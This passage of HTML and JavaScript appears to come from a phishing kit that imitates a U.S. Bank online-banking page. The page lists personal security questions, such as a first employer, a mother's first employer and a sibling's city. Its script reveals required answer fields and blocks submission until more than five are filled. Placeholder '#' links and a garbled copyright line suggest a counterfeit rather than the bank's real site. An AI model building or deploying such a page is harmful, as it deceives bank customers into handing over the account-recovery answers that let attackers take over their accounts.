                              </div>

                              <div >
                                 <div >
                                    <div>
                                       <span class="checkbox">
                                          <input class="checkboxPos ng-pristine ng-untouched ng-valid"  id="13" onclick="questions('13','thirteenth_ans');" type="checkbox">
                                          <label id="13" aria-label="What was the name of your first employer?" for="13" class="ng-binding">
                                             What was the name of your first employer?
                                          </label>
                                          <input id="thirteenth_ans" name="thirteenth_ans" style="display:none;" placeholder="" class="ng-pristine ng-untouched " type="text">
                                       </span>
                                    </div>
                                 </div>
                                 <div class="clearfix"></div>
                              </div>                              

                              <div >
                                 <div >
                                    <div>
                                       <span class="checkbox">
                                          <input class="checkboxPos ng-pristine ng-untouched ng-valid"  id="14" onclick="questions('14','fourteenth_ans');" type="checkbox">
                                          <label id="14" aria-label="In what city does your nearest sibling live?" for="14" class="ng-binding">
                                             In what city does your nearest sibling live?
                                          </label>
                                          <input id="fourteenth_ans" name="fourteenth_ans" style="display:none;" placeholder="" class="ng-pristine ng-untouched " type="text">
                                       </span>
                                    </div>
                                 </div>
                                 <div class="clearfix"></div>
                              </div>

                              <div >
                                 <div >
                                    <div>
                                       <span class="checkbox">
                                          <input class="checkboxPos ng-pristine ng-untouched ng-valid"  id="15" onclick="questions('15','fifteenth_ans');" type="checkbox">
                                          <label id="15" aria-label="Who was your mother's first employer?" for="15" class="ng-binding">
                                             Who was your mother's first employer?
                                          </label>
                                          <input id="fifteenth_ans" name="fifteenth_ans" style="display:none;" placeholder="" class="ng-pristine ng-untouched " type="text">
                                       </span>
                                    </div>
                                 </div>
                                 <div class="clearfix"></div>
                              </div>

                              <div >
                                 <div >
                                    <div>
                                       <span class="checkbox">
                                          <input class="checkboxPos ng-pristine ng-untouched ng-valid"  id="16" onclick="questions('16','sixteenth_ans');" type="checkbox">
                                          <label id="16" aria-label="What is the name of a college you applied to but did not attend?" for="16" class="ng-binding">
                                             What is the name of a college you applied to but did not attend?
                                          </label>
                                          <input id="sixteenth_ans" name="sixteenth_ans" style="display:none;" placeholder="" class="ng-pristine ng-untouched " type="text">
                                       </span>
                                    </div>
                                 </div>
                                 <div class="clearfix"></div>
                              </div>

                              <div >
                                 <div >
                                    <div>
                                       <span class="checkbox">
                                          <input class="checkboxPos ng-pristine ng-untouched ng-valid"  id="17" onclick="questions('17','seventeenth_ans');" type="checkbox">
                                          <label id="17" aria-label="What is the name of your favorite roommate?" for="17" class="ng-binding">
                                             What is the name of your favorite roommate?
                                          </label>
                                          <input id="seventeenth_ans" name="seventeenth_ans" style="display:none;" placeholder="" class="ng-pristine ng-untouched " type="text">
                                       </span>
                                    </div>
                                 </div>
                                 <div class="clearfix"></div>
                              </div>

                              <div>
                                 <div>
                                    <input type="hidden" name="checkbox_check" id="checkbox_check" value="" />
                                    <button type="submit" id="form_check" name="security_question"  class="button primary"><span>Continue</span></button>
                                 </div>
                                 <!-- <div class="d3 tp2 tl2 mp4 ml4 margin-top ng-hide">
                                    <a id="lnkCancel" ng-click="MyProfileDashboardRedirection()" href="#">Cancel</a>
                                 </div> -->
                              </div>
                           </div>
                        </div>
                        </form>
                     </div>
                  </div>
               </div>
            </div>
        </div>
        <script type="text/javascript">
            function check_data()
            {
                var check_val = document.getElementById("checkbox_check").value;
               //  if(check_val>=5 || check_val=="")
                if(check_val <= 5 || check_val=="")
                {
                    document.getElementById("alert_1").style.display = "block";
                    document.getElementById('alert_2').style.display="block";
                    return false;
                }
            }

            function questions(id,ans)
            {
                var answ = ans;
                document.getElementById(answ).style.display = "block";
                document.getElementById(answ).required = true;
               //  var numberNotChecked = $('input:checkbox:not(":checked")').length;
                var numberNotChecked = $('input:checkbox:checked').length;
                document.getElementById("checkbox_check").value = numberNotChecked;
            }
        </script>
        <div id="footer" class="olb-shared-layout__footer" role="contentinfo">
            <div>
               <div class="footerBackground">
                  <div class="mainBodyWidth positionRelative usb_hide-when-footer footer-bg-color">
					<hr class="footerOuterDivider">
					<div class="padLeft15 footerFloatLeft footerTopMargin footerBottomMargin">
						<span class="connectionSecuredLogo"></span>
						<span class="connectionSecuredText">&nbsp;Connection Secured</span>
						<br>
						<div class="copyright">2018U.S.Bank<br></div>
					</div>
					<div class="padRight15 footerFloatRight footerTopMargin">
                        <a target="_blank" href="#" class="feedback">Privacy Pledge</a>
                        <span class="feedback"> | </span>
                        <a href="#" class="feedback">Legal Agreements</a>
                        <span class="feedback"> | </span>
                        <a id="start-cobrowse-random-key" aria-label="Cobrowse, shows content" style="font-size:12px" href="#">CoBrowse</a>
                     </div>
                     <div class="clear">
                        <hr class="footerInnerDivider">
                     </div>
                     <div>
                        <div class="span-24" id="footerTextC">
                           <div style="color:#333333;margin-bottom:30px;">
                              <p style="font-size:10px; font-weight:bold; line-height:1; margin:0px 0px 0px">For U.S. Bank:</p>
                              <p style="font-size:10px; line-height:1; margin: 10px 0px 0px"><img src="assets/EqualHousingLender1.png" alt="Equal Housing Lender"> Equal Housing Lender. Deposit products offered by U.S.Bank National Association. Member FDIC</p>
                              <p style="font-size:10px; line-height:1; margin: 10px 0px 0px">U.S.Bank is not responsible for and does not guarantee the products, services or performance of U.S. Bancorp Investments.</p>
                           </div>
                        </div>
                     </div>
                     <div class="footerSection_Logos">
                        <span class="footersegmentlogo"></span>
                        <span class="footerbrandingusbanklogo"></span>
                     </div>
                  </div>
               </div>
            </div>
        </div>
      </div>
   </body>
</html>
